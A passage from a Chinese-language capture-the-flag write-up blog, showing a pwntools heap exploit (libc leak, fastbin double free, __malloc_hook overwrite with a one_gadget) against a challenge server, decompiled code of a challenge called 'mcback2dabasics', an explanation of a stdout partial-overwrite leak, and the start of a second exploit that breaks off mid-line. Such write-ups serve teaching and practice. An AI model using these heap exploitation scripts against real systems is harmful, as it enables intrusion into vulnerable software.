class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line">IP = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leak_libc_32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_ucontext</span>(<span class="params"></span></span><br><span class="line"><span class="params">    src: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    rsp=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rbx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rbp=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r12=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r13=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r14=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r15=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rsi=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rdi=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rcx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r8=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r9=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rdx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rip=<span class="number">0xDEADBEEF</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">bytearray</span>:</span><br><span class="line">    b = <span class="built_in">bytearray</span>(<span class="number">0x200</span>)</span><br><span class="line">    b[<span class="number">0xE0</span>:<span class="number">0xE8</span>] = p64(src)  <span class="comment"># fldenv ptr</span></span><br><span class="line">    b[<span class="number">0x1C0</span>:<span class="number">0x1C8</span>] = p64(<span class="number">0x1F80</span>)  <span class="comment"># ldmxcsr</span></span><br><span class="line"></span><br><span class="line">    b[<span class="number">0xA0</span>:<span class="number">0xA8</span>] = p64(rsp)</span><br><span class="line">    b[<span class="number">0x80</span>:<span class="number">0x88</span>] = p64(rbx)</span><br><span class="line">    b[<span class="number">0x78</span>:<span class="number">0x80</span>] = p64(rbp)</span><br><span class="line">    b[<span class="number">0x48</span>:<span class="number">0x50</span>] = p64(r12)</span><br><span class="line">    b[<span class="number">0x50</span>:<span class="number">0x58</span>] = p64(r13)</span><br><span class="line">    b[<span class="number">0x58</span>:<span class="number">0x60</span>] = p64(r14)</span><br><span class="line">    b[<span class="number">0x60</span>:<span class="number">0x68</span>] = p64(r15)</span><br><span class="line"></span><br><span class="line">    b[<span class="number">0xA8</span>:<span class="number">0xB0</span>] = p64(rip)  <span class="comment"># ret ptr</span></span><br><span class="line">    b[<span class="number">0x70</span>:<span class="number">0x78</span>] = p64(rsi)</span><br><span class="line">    b[<span class="number">0x68</span>:<span class="number">0x70</span>] = p64(rdi)</span><br><span class="line">    b[<span class="number">0x98</span>:<span class="number">0xA0</span>] = p64(rcx)</span><br><span class="line">    b[<span class="number">0x28</span>:<span class="number">0x30</span>] = p64(r8)</span><br><span class="line">    b[<span class="number">0x30</span>:<span class="number">0x38</span>] = p64(r9)</span><br><span class="line">    b[<span class="number">0x88</span>:<span class="number">0x90</span>] = p64(rdx)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setcontext32</span>(<span class="params">libc: ELF, **kwargs</span>) -&gt; (<span class="built_in">int</span>, <span class="built_in">bytes</span>):</span><br><span class="line">    got = libc.address + libc.dynamic_value_by_tag(<span class="string">&quot;DT_PLTGOT&quot;</span>)</span><br><span class="line">    plt_trampoline = libc.address + libc.get_section_by_name(<span class="string">&quot;.plt&quot;</span>).header.sh_addr</span><br><span class="line">    <span class="keyword">return</span> got, flat(</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(got + <span class="number">0x218</span>),</span><br><span class="line">        p64(libc.symbols[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">32</span>),</span><br><span class="line">        p64(plt_trampoline) * <span class="number">0x40</span>,</span><br><span class="line">        create_ucontext(got + <span class="number">0x218</span>, rsp=libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, **kwargs),</span><br><span class="line">    )</span><br><span class="line"><span class="comment"># e.g. dest, payload = setcontext32.setcontext32(</span></span><br><span class="line"><span class="comment">#         libc, rip=libc.sym[&quot;system&quot;], rdi=libc.search(b&quot;/bin/sh&quot;).__next__()</span></span><br><span class="line"><span class="comment">#     )</span></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">IP = <span class="string">&quot;challs.tfcctf.com&quot;</span></span><br><span class="line">PORT = <span class="number">31822</span></span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_password</span>(<span class="params"><span class="built_in">len</span>,password,name</span>):</span><br><span class="line">    sla(<span class="string">&quot;Input:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;length&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">    sa(<span class="string">&quot;Enter credentials:&quot;</span>,password)</span><br><span class="line">    sa(<span class="string">&quot;Name of the credentials:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_credentials</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Input:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Select index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_password</span>():</span><br><span class="line">    sla(<span class="string">&quot;Input:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">save_password(<span class="number">0x68</span>, <span class="string">b&quot;AAAAAAAA&quot;</span>, <span class="string">b&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">save_password(<span class="number">0x68</span>, <span class="string">b&quot;BBBBBBBB&quot;</span>, <span class="string">b&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">save_password(<span class="number">0x68</span>, <span class="string">b&quot;CCCCCCCC&quot;</span>, <span class="string">b&quot;cccccccc&quot;</span>)</span><br><span class="line">save_password(<span class="number">0x68</span>, <span class="string">b&quot;DDDDDDDD&quot;</span>, <span class="string">b&quot;dddddddd&quot;</span>)</span><br><span class="line">save_password(<span class="number">0x68</span>, <span class="string">b&quot;EEEEEEEE&quot;</span>, <span class="string">b&quot;eeeeeeee&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete_credentials(<span class="number">0</span>)</span><br><span class="line">save_password(<span class="number">0x68</span>, <span class="string">b&quot;A&quot;</span> * <span class="number">0x68</span> + p8(<span class="number">0xe1</span>), <span class="string">b&quot;a&quot;</span> * <span class="number">0x8</span>)</span><br><span class="line">delete_credentials(<span class="number">1</span>) <span class="comment"># unsorted bin </span></span><br><span class="line">save_password(<span class="number">0x68</span>, <span class="string">b&quot;B&quot;</span> * <span class="number">0x8</span>, <span class="string">b&quot;b&quot;</span> * <span class="number">0x8</span>) <span class="comment"># leak unsortedbin bk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">check_password()</span><br><span class="line">ru(<span class="string">b&quot;B&quot;</span> * <span class="number">0x8</span>)</span><br><span class="line">libc_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x76c3f6bb4c90</span> - <span class="number">0x76c3f6800000</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc.addr = libc_base</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xe1fa1</span></span><br><span class="line"></span><br><span class="line">save_password(<span class="number">0x68</span>,<span class="string">b&quot;FFFFFFFF&quot;</span>,<span class="string">&quot;ffffffff&quot;</span>) <span class="comment"># heap overlap (cccccccc and ffffffff)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">delete_credentials(<span class="number">2</span>) <span class="comment"># delete cccccccc</span></span><br><span class="line">delete_credentials(<span class="number">3</span>)</span><br><span class="line">delete_credentials(<span class="number">5</span>) <span class="comment"># delete ffffffff</span></span><br><span class="line"></span><br><span class="line">save_password(<span class="number">0x68</span>, p64(malloc_hook - <span class="number">0x23</span>), <span class="string">b&quot;f&quot;</span> * <span class="number">0x8</span>)</span><br><span class="line">save_password(<span class="number">0x68</span>, <span class="string">b&#x27;D&#x27;</span> * <span class="number">8</span>, <span class="string">b&quot;d&quot;</span> * <span class="number">0x8</span>)</span><br><span class="line">save_password(<span class="number">0x68</span>, p64(malloc_hook - <span class="number">0x23</span>), <span class="string">b&quot;c&quot;</span> * <span class="number">0x8</span>)</span><br><span class="line">save_password(<span class="number">0x68</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget), <span class="string">b&quot;c&quot;</span> * <span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">sla(<span class="string">&quot;length&quot;</span>,<span class="built_in">str</span>(<span class="number">0x48</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="mcback2dabasics"><a href="#mcback2dabasics" class="headerlink" title="mcback2dabasics"></a>mcback2dabasics</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(<span class="built_in">int</span> a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> choice; // [rsp+0h] [rbp-10h] BYREF</span><br><span class="line">  <span class="built_in">int</span> i; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v5; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  setvbuf(stdin, 0LL, <span class="number">2</span>, 0LL);</span><br><span class="line">  setvbuf(stdout, 0LL, <span class="number">2</span>, 0LL);</span><br><span class="line">  setvbuf(stderr, 0LL, <span class="number">2</span>, 0LL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; ++i )</span><br><span class="line">    chunk_list[i] = 0LL;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;Is that all you got? Bye!&quot;</span>);</span><br><span class="line">      exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">      create();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      puts(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned __int64 sub_9F4()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> idx; // eax</span><br><span class="line">  _DWORD nbytes[<span class="number">3</span>]; // [rsp+Ch] [rbp-14h] BYREF</span><br><span class="line">  unsigned __int64 v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  <span class="keyword">if</span> ( chunk_number &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;No more memory available&quot;</span>);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(<span class="string">&quot;How much?&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;[+]&gt; &quot;</span>);</span><br><span class="line">  scanf(<span class="string">&quot;%d&quot;</span>, nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( nbytes[<span class="number">0</span>] &gt; 0x70u )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;Nope, too big&quot;</span>);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)&amp;nbytes[<span class="number">1</span>] = malloc((unsigned <span class="built_in">int</span>)(nbytes[<span class="number">0</span>] + <span class="number">1</span>));</span><br><span class="line">  puts(<span class="string">&quot;Data?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *(void **)&amp;nbytes[<span class="number">1</span>], nbytes[<span class="number">0</span>]);</span><br><span class="line">  *(_BYTE *)(nbytes[<span class="number">0</span>] + *(_QWORD *)&amp;nbytes[<span class="number">1</span>]) = <span class="number">0</span>;</span><br><span class="line">  idx = chunk_number++;</span><br><span class="line">  chunk_list[idx] = *(_QWORD *)&amp;nbytes[<span class="number">1</span>];</span><br><span class="line">  puts(<span class="string">&quot;Job done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned __int64 delete()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned <span class="built_in">int</span> idx; // [rsp+4h] [rbp-Ch] BYREF</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(<span class="string">&quot;Which one?&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;[+]&gt; &quot;</span>);</span><br><span class="line">  scanf(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0x3F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;Invalid index&quot;</span>);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  free((void *)chunk_list[idx]);</span><br><span class="line">  puts(<span class="string">&quot;Job done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>glibc 2.24，这个题非常困难，有uaf，但是泄露不出来地址，我知道要写stdout 打puts的利用链去泄露地址但是不知道怎么做，后面复现的时候发现可以通过堆风水让unsortedbin的fd和fastbin的fd重叠，main arena + 88离 stdout很近，libc地址低12位是固定的，覆盖两个字节就能到stdout，然后因为有size的检查，但是stdoutt往上一小段距离那有一个0x7f的地址可以通过错位字节分配到上面然后绕过这个检查，所以远程的话有十六分之一的概率能打通，需要爆破。申请到stdout后，把write base的低位覆盖，就可以通过puts的利用链去泄露libc。</p>
<p>具体的堆风水是，因为没有edit函数，可以通过在大堆块里面伪造fake chunk然后double free 让chunklist中有fakechunk的指针，伪造一个unsortedbin范围的fakechunk fakechunk和next chunk重叠，或者是大于，通过切分unsortedbin调整fd的位置，重叠后就可以利用了，记得把size改回去，因为重叠后unsortedbin切分的时候会写写size，也不能保证unsortedbin切分后size和原来相同，因为会分到fastbin</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">IP = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leak_libc_32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_ucontext</span>(<span class="params"></span></span><br><span class="line"><span class="params">    src: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    rsp=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rbx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rbp=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r12=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r13=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r14=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r15=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rsi=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rdi=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rcx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r8=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    r9=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rdx=<span class="number">0</span>,</span></span><br><span class="line"><span class="params">    rip=<span class="number">0xDEADBEEF</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">bytearray</span>:</span><br><span class="line">    b = <span class="built_in">bytearray</span>(<span class="number">0x200</span>)</span><br><span class="line">    b[<span class="number">0xE0</span>:<span class="number">0xE8</span>] = p64(src)  <span class="comment"># fldenv ptr</span></span><br><span class="line">    b[<span class="number">0x1C0</span>:<span class="number">0x1C8</span>] = p64(<span class="number">0x1F80</span>)  <span class="comment"># ldmxcsr</span></span><br><span class="line"></span><br><span class="line">    b[<span class="number">0xA0</span>:<span class="number">0xA8</span>] = p64(rsp)</span><br><span class="line">    b[<span class="number">0x80</span>:<span class="number">0x88</span>] = p64(rbx)</span><br><span class="line">    b[<span class="number">0x78</span>:<span class="number">0x80</span>] = p64(rbp)</span><br><span class="line">    b[<span class="number">0x48</span>:<span class="number">0x50</span>] = p64(r12)</span><br><span class="line">    b[<span class="number">0x50</span>:<span class="number">0x58</span>] = p64(r13)</span><br><span class="line">    b[<span class="number">0x58</span>:<span class="number">0x60</span>] = p64(r14)</span><br><span class="line">    b[<span class="number">0x60</span>:<span class="number">0x68</span>] = p64(r15)</span><br><span class="line"></span><br><span class="line">    b[<span class="number">0xA8</span>:<span class="number">0xB0</span>] = p64(rip)  <span class="comment"># ret ptr</span></span><br><span class="line">    b[<span class="number">0x70</span>:<span class="number">0x78</span>] = p64(rsi)</span><br><span class="line">    b[<span class="number">0x68</span>:<span class="number">0x70</span>] = p64(rdi)</span><br><span class="line">    b[<span class="number">0x98</span>:<span class="number">0xA0</span>] = p64(rcx)</span><br><span class="line">    b[<span class="number">0x28</span>:<span class="number">0x30</span>] = p64(r8)</span><br><span class="line">    b[<span class="number">0x30</span>:<span class="number">0x38</span>] = p64(r9)</span><br><span class="line">    b[<span class="number">0x88</span>:<span class="number">0x90</span>] = p64(rdx)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setcontext32</span>(<span class="params">libc: ELF, **kwargs</span>) -&gt; (<span class="built_in">int</span>, <span 